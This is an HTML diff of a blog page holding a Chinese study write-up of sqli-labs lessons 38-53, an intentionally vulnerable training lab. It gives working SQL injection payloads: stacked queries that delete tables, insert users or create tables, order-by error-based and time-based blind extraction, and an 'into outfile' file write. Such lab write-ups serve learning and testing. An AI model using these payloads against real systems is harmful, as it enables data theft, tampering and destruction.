@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Less-38 stack injectionstack injection堆叠注入我们知道在mysql中，每一条语句结尾加**；表示语句结束，这样子我们想到了可以多句SQL语句一起使用，也就是stacked injection原理在SQL中，;**用来表示一条sql语句的结束，那么我们在结束一条sql语句后继续构造下一条语句，会不会一起执行？所以就有了堆叠注入，它和union injection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli labs38-53学习笔记">
+<meta property="og:url" content="https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Intro&#39; Blog">
+<meta property="og:description" content="Less-38 stack injectionstack injection堆叠注入我们知道在mysql中，每一条语句结尾加**；表示语句结束，这样子我们想到了可以多句SQL语句一起使用，也就是stacked injection原理在SQL中，;**用来表示一条sql语句的结束，那么我们在结束一条sql语句后继续构造下一条语句，会不会一起执行？所以就有了堆叠注入，它和union injection">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less28.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less29.png">
+<meta property="article:published_time" content="2018-10-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-29T10:14:24.831Z">
+<meta property="article:author" content="Intro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less28.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>sqli labs38-53学习笔记</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/10/20/sqli%20labs54-65%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=sqli labs38-53学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=sqli labs38-53学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli labs38-53学习笔记&body=Check out this article: https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=sqli labs38-53学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=sqli labs38-53学习笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        sqli labs38-53学习笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Intro</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-10-17T16:00:00.000Z" class="dt-published" itemprop="datePublished">2018-10-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Less-38 stack injectionstack injection堆叠注入我们知道在mysql中，每一条语句结尾加**；<strong>表示语句结束，这样子我们想到了可以多句SQL语句一起使用，也就是stacked injection原理在SQL中，</strong>;**用来表示一条sql语句的结束，那么我们在结束一条sql语句后继续构造下一条语句，会不会一起执行？所以就有了堆叠注入，它和union injection（联合注入）的区别在于 union或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行任意的语句，例如：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3</code></td>
+<td><code>1;DELETE FROM products 服务端生成的sql语句为： select * from products where productid=1;DELETE FROM products</code></td>
+</tr>
+</tbody></table>
+<p>当执行查询后，第一条显示查询信息，第二条则将整个表删除。局限性堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。<br>Ps：<br>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。less-38上述的staced injection的知识，在本关可以直接利用，经过测试发现是单引号闭合的，于是构造payload：<code>?id=1&#39;;insert into users(id,username,password) values (&#39;133&#39;,&#39;less-38&#39;,&#39;stacked-injection&#39;)--+</code><br>这里第一条语句查询数据，然后第二条语句插入数据Less-39这道题和上一道的差别在于id没有进行处理，数字型，不累赘了Less-40这道题是没有回显的，而且对id的处理是**(‘$id’)**Less-41这道题和Less-39差不多，没有回显Less-42这里和前面做过的二次注入不同，这里还是要用到堆叠注入，通过源码知道，password在post过程中，没有通过mysql_real_escape_string()函数的处理，所以在登陆的时候可以对密码选项进行attack</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2</code></td>
+<td><code>username:admin password:1&#39;;create table less42 like users# //这里密码随便输的，重点在于第二条语句创建一个新表</code></td>
+</tr>
+</tbody></table>
+<p>Less-43和上一题类似，对password的处理为**(‘$pwd’)<strong>Less-44、45没有报错，差不多的，不想写了Less-46 order by 后的injection这道题和前面的都不一样，于是查看源码，发现：<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less28.png" alt="1539608707050"><br>从图中可以看出，注入点在order by 后面的参数，不同与where后的注入点，不能使用union等注入，这里学习下order by注入order by 注入可控制的参数在order by子句后，类似</strong>select * from goods order by $_GET[‘order’]**<br>我们可以利用order by 后的一些参数进行注入<br>order by后的数字可以作为一个注入点。也就是构造order by后的一个语句，让该语句执行的结果为一个数，尝试<code>?sort=right(version(),1)</code>，没有报错，将right换成left都一样，说明数字没有起作用，考虑布尔类型，此时可以用报错注入和延时注入<br>构造参数可以有三种形式，直接添加注入语句，？sort&#x3D;(select …..)、利用一些函数，例如rand()，rand(true)和rand(false)的结果是不一样的、利用and，例如？sort&#x3D;1 and (….)、同时还可以利用报错注入和延时注入的方式<strong>报错注入</strong><br><code>?sort=(select count(*) from information_schema.tables group by concat(0x7e,(select database()),0x7e,floor(rand()*2)))</code><br>万能的xpath：<br><code>?sort=(updatexml(1,concat(0x7e,(select database()),0x7e),1))</code>或者<code>?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</code>或者<code>?sort=(extractvalue(1,concat(0x7e,(select database()),0x7e)))</code><br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less29.png"><br><strong>延时注入</strong><br><code>?sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1)</code>或者<code>?sort=(if(ascii(substr(database(),1,1))=115,0,sleep(5)))</code><br><strong>导入导出文件into outfile 参数</strong><br><code>?sort=1 into outfile &quot;d:\\1.txt&quot;</code>Less-47这里的sql语句为<code>SELECT * FROM users ORDER BY &#39;$id&#39;</code>，和上一题类似，给几个payload：<code>?sort=1&#39; and rand(ascii(left(database(),1))=115)--+</code>、<code>?sort=1&#39; and (updatexml(1,concat(0x7e,(select database()),0x7e),1))--+</code>Less-48、49本两关和前两道的区别在于不能使用报错注入，不进行错误回显，也就是盲注吧Less-50~53 order by stacked injection<code>?sort=1;create table less50 like users</code>，创建一个less50的表</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=sqli labs38-53学习笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=sqli labs38-53学习笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli labs38-53学习笔记&body=Check out this article: https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs38-53学习笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=sqli labs38-53学习笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://1ntro.github.io/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=sqli labs38-53学习笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Intro
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
